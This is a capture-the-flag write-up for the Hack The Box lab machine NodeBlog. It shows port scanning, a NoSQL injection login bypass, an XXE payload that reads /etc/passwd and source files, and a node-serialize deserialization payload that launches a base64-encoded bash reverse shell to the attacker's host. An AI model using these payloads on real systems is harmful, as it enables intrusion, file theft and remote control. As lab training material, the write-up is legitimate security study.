---
layout: post
comments: false
title: "NodeBlog HTB Write Up"
tags: ['hackthebox', 'writeup', 'nosqlinyection']
---

## Introduction
Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, but we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!
hi


## Ports recognizement
The ip address of the machine is 10.10.11.139
We are going to recognise all the post open on the machine and export the result into a grepeable file:
```bash
nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.139 -oG ports
```
The ports open are 22,5000

We are going to scan this ports and export into a nmap file
```bash
nmap -sSV --min-rate 5000 -vvv -p22,5000 -n -Pn 10.10.11.139 -oN services
```
We can see there is a ssh service running at port 22 and a http (node.js) service running at port 5000

## Inspect the web and fuzzing
While we inspect the web we are going to leave wfuzz fuzzing the site in case it find something relevant.

```bash
wfuzz --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -u 10.10.11.139:5000/FUZZ
```

We can see a green login button. Let's proceed.
We can see a login form.
We can try some sql inyection inputs like ' or ' -- -
but won't work. 

We have to test also nosql inyection. [PayloadAllTheThings][attp] have some exploit to bypass login form.
We are going to use burpsuite to intercept the response and modify the fields on the forms.

If we input random logins we hace the response Invalid Username, but if we set in the username field admin and in the password random text we get Invalid Password, so we have a method to get users.
Now we can try bypass the password with nosqli.
```bash
{"user": "admin", "password": {"$ne": null}}
```
Also we can make a script to dump all posible usernames ans their relative passwords [nosqlforce.py][nsqlf]

> WE ARE INSIDE :boom:

We see an upload button. We try to upload a random file and we get this response:


This might be a vulnerability to XXE inyection.
Also [PayloadAllTheThings][attpxxe] cover this subject with some payloads.
We can try some payloads like 
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```
In /etc/passwd we set the path to the file we want to see.
We create an xml file with this payload and we can try to upload this.

We have a response that tell us that we give the xml in the incorrect format. If we inspect the code we can see that the correct format is:
```html
Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

So we modify our payload to follow that structure:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
        <title>Example Post</title>
        <description>Example Description</description>
        <markdown>&file;</markdown>
</post>
```
The &file; contains the output of the payload.

If we look into the source code of the web site we can see the /etc/passwd file wich contains multiple users of the system.

At his point we can enumerate multiple files of the machine.
We can make a simple script which is going to help to enumerate the site faster [xxe-file-dumper.py][xfd]

Let's continue looking the website. If we try to post another article by our own we get an error:

We can see the web is hosted on the /opt/blog.
We can look for a server.js or main.js file which usually have the main server code of the web server. Let's try it. We are going to use [xxe-file-dumper.py][xfd]

```bash
python3 xxe-file-dumper.py -u http://10.10.11.139:5000/articles/xml -f /opt/blog/server.js
```

We can see the we have an output file:
```node
const express = require(&#39;express&#39;)
const mongoose = require(&#39;mongoose&#39;)
const Article = require(&#39;./models/article&#39;)
const articleRouter = require(&#39;./routes/articles&#39;)
const loginRouter = require(&#39;./routes/login&#39;)
const serialize = require(&#39;node-serialize&#39;)
const methodOverride = require(&#39;method-override&#39;)
const fileUpload = require(&#39;express-fileupload&#39;)
const cookieParser = require(&#39;cookie-parser&#39;);
const crypto = require(&#39;crypto&#39;)
const cookie_secret = &#34;UHC-SecretCookie&#34;
//var session = require(&#39;express-session&#39;);
const app = express()

mongoose.connect(&#39;mongodb://localhost/blog&#39;)

app.set(&#39;view engine&#39;, &#39;ejs&#39;)
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride(&#39;_method&#39;))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: &#34;UHC-SecretKey-123&#34;}));

function authenticated(c) {
    if (typeof c == &#39;undefined&#39;)
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash(&#39;md5&#39;).update(cookie_secret + c.user).digest(&#39;hex&#39;)) ){
        return true
    } else {
        return false
    }
}


app.get(&#39;/&#39;, async (req, res) =&gt; {
    const articles = await Article.find().sort({
        createdAt: &#39;desc&#39;
    })
    res.render(&#39;articles/index&#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use(&#39;/articles&#39;, articleRouter)
app.use(&#39;/login&#39;, loginRouter)


app.listen(5000)
```

We can see that the server is using an unserialize function without sanitaze input. This can be a desirializing vulneravility.

Usually the unserialize input is the cookie, because this and It's called c the code is probably deserializing the cookie.

The problem about the insecure deserilization is that if you use IIFE you can execute code when the function is deserializting even before the string is interpreted. So we can send the payload into the cookie, when the server desirialize the string, this will be executed even the cookie doen't have any sense.
This [post][deserialize_post] explain it pretty well.
The payload is the next:

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls', function(error, stdout, stderr){console.log(stdout)});}()"}
```

We can inject a revershell payload into the code that we want to run.
```bash
bash -i >& /dev/tcp/{your_tun0_ip}/443 0>&1
```
In order to pass this code into the url we have to convert it in base64
```bash
echo 'bash -i >& /dev/tcp/{your_tun0_ip}/443 0>&1' | base64
```
In the victim's machine we have to reverse the base64 format, so our final revershe shell payload is:
```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg==|base64 -d|bash
```
We mix it the the rec payload, the result:
```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg==|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()"}
```

With burpsuite we modify the cookie when we make a get request to the main page, we introduce the payload into the cookie. Mention that we have to previusly url encode this entire payload beacuse they are special character that mean's another thing in a url format (like ;).
Encoding all will asure us that the payload will work fine.

We start listening with netcat in the 443 port
```bash
sudo nc -lnvp 443
```

We send the payload, and we have a shell!
We can try to capture the flag which is alocate at /home/admin/user.txt
For some reason we dont hace permission to read the content of the folder, but our user owns the folder, so we just can chnage permission of the folder with
```bash
chmod +x /home/admin
```
Now we can see the flag!
```bash
cat /home/admin/user.txt
```

## Privilige escalation
We can try use the same password to the super user
```bash
sudo su
```
We introduce the password which we captured before when we dump the password of admin user with [nosqlforce.py][nsqlf].
They reuse the password so we are already logged root.
We can capture the flag which is located at /root/root.txt
```bash
cat /root/root.txt
```

Thank's all for reading! 📖


[nsqlf]:https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/nosqlbruteforce.py

[deserialize_post]: https://sking7.github.io/articles/1601216121.html

[xfd]: https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/xxe-file-dumper.py
[attp]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

[attpxxe]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
